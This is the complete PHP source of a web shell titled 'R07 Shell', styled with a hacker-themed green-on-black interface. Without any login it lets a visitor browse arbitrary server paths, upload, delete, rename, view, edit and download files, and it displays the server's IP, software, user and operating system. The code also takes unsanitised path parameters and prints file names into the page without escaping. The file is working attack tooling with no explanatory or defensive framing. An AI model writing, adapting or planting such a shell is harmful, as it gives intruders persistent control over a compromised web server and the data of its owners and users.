<?php
session_start();
ob_start();

$path = $_GET['path'] ?? getcwd();
$files = scandir($path);

$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$server = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
$user = get_current_user();
$os = php_uname();
$writable = is_writable($path);
$pathColor = $writable ? "#00ff00" : "#ff3333";

// === Delete
if (isset($_GET['delete'])) {
  $target = $path . "/" . $_GET['delete'];
  is_dir($target) ? rmdir($target) : unlink($target);
  header("Location: ?path=" . urlencode($path));
  exit;
}

// === Rename
if (isset($_POST['renamebtn'])) {
  $old = $path . "/" . $_POST['oldname'];
  $new = $path . "/" . $_POST['newname'];
  rename($old, $new);
  header("Location: ?path=" . urlencode($path));
  exit;
}

// === Save Edit
if (isset($_POST['saveedit'])) {
  $editPath = $path . "/" . $_POST['editfile'];
  file_put_contents($editPath, $_POST['newcontent']);
  echo "<p>✅ File updated!</p>";
}

// === Download
if (isset($_GET['download'])) {
  $dlPath = $path . "/" . $_GET['download'];
  if (is_file($dlPath)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($dlPath).'"');
    header('Content-Length: ' . filesize($dlPath));
    readfile($dlPath);
    exit;
  }
}
?>
<!DOCTYPE html>
<html>
<head>
  <title>R07 Shell</title>
  <style>
    body { background:#000; color:#0f0; font-family:monospace; padding:20px; }
    a, button { color:#0ff; text-decoration:none; background:none; border:none; cursor:pointer; font-family:monospace; }
    a:hover, button:hover { text-decoration:underline; }
    .navbar { background:#111; padding:10px; border-bottom:1px solid #0f0; margin-bottom:20px; }
    .navbar span { margin-right:20px; }
    table { width:100%; border-collapse:collapse; }
    th, td { border:1px solid #0f0; padding:8px; text-align:left; }
    form { margin-top:10px; }
    pre, textarea { background:#111; color:#0f0; padding:10px; border:1px solid #0f0; width:100%; }
    button.nav { margin:3px; padding:5px 10px; border:1px solid #0f0; background:#111; color:#0f0; }
  </style>
</head>
<body>

<div class="navbar">
  <span>🔥 <b>R07 SHELL</b></span>
  <span>💻 IP: <?= $ip ?></span>
  <span>🛠 Server: <?= $server ?></span>
  <span>👤 User: <?= $user ?></span>
</div>

<p><b>📂 Path:</b> <span style="color:<?= $pathColor ?>"><?= htmlspecialchars($path) ?></span></p>

<form method="get">
  <input type="hidden" name="path" value="<?= dirname($path) ?>">
  <button class="nav">⬅️ Back</button>
</form>

<form method="post" enctype="multipart/form-data">
  <input type="file" name="upload">
  <input type="submit" value="Upload">
</form><br>

<?php
// Upload
if ($_FILES) {
  $target = $path . "/" . basename($_FILES["upload"]["name"]);
  if (move_uploaded_file($_FILES["upload"]["tmp_name"], $target)) {
    echo "✅ Uploaded: " . htmlspecialchars($_FILES["upload"]["name"]) . "<br><br>";
  } else {
    echo "❌ Upload failed<br><br>";
  }
}

// View file
if (isset($_GET['view'])) {
  $fileToView = $path . "/" . $_GET['view'];
  if (is_file($fileToView)) {
    echo "<h3>👁️ View File: " . htmlspecialchars($_GET['view']) . "</h3>";
    echo "<pre>" . htmlspecialchars(file_get_contents($fileToView)) . "</pre><br>";
  }
}

// Edit file
if (isset($_GET['edit'])) {
  $editFile = $path . "/" . $_GET['edit'];
  if (is_file($editFile)) {
    $content = htmlspecialchars(file_get_contents($editFile));
    echo "<h3>✏️ Edit File: " . htmlspecialchars($_GET['edit']) . "</h3>";
    echo "<form method='post'>
      <input type='hidden' name='editfile' value='" . $_GET['edit'] . "'>
      <textarea name='newcontent' rows='15'>$content</textarea><br>
      <input type='submit' name='saveedit' value='Save'>
    </form><br>";
  }
}

// Rename Form
if (isset($_GET['rename'])) {
  $old = $_GET['rename'];
  echo "<form method='post'>
    <input type='hidden' name='oldname' value='$old'>
    Rename <b>$old</b> to: <input type='text' name='newname'>
    <input type='submit' name='renamebtn' value='Rename'>
  </form><br>";
}

// Table
echo "<table><tr><th>Name</th><th>Type</th><th>Size</th><th>Modified</th><th>Action</th></tr>";
foreach ($files as $file) {
  if ($file === ".") continue;
  $fullpath = $path . "/" . $file;
  $encodedFile = urlencode($file);

  $type = is_dir($fullpath) ? "Folder" : "File";
  $size = is_file($fullpath) ? filesize($fullpath) . " B" : "-";
  $mod = date("Y-m-d H:i:s", filemtime($fullpath));

  echo "<tr>";
  if (is_dir($fullpath)) {
    echo "<td>
      <form method='get' style='display:inline'>
        <input type='hidden' name='path' value='$fullpath'>
        <button class='nav'>📁 $file</button>
      </form>
    </td>";
  } else {
    echo "<td>$file</td>";
  }

  echo "<td>$type</td><td>$size</td><td>$mod</td>";
  echo "<td>
    <a href='?path=$path&delete=$encodedFile' onclick='return confirm(\"Hapus?\")'>❌ Delete</a> |
    <a href='?path=$path&rename=$encodedFile'>✏️ Rename</a>";
  if (is_file($fullpath)) {
    echo " | <a href='?path=$path&view=$encodedFile'>👁️ View</a>";
    echo " | <a href='?path=$path&edit=$encodedFile'>📝 Edit</a>";
    echo " | <a href='?path=$path&download=$encodedFile'>📥 Download</a>";
  }
  echo "</td></tr>";
}
echo "</table>";
?>
</body>
</html>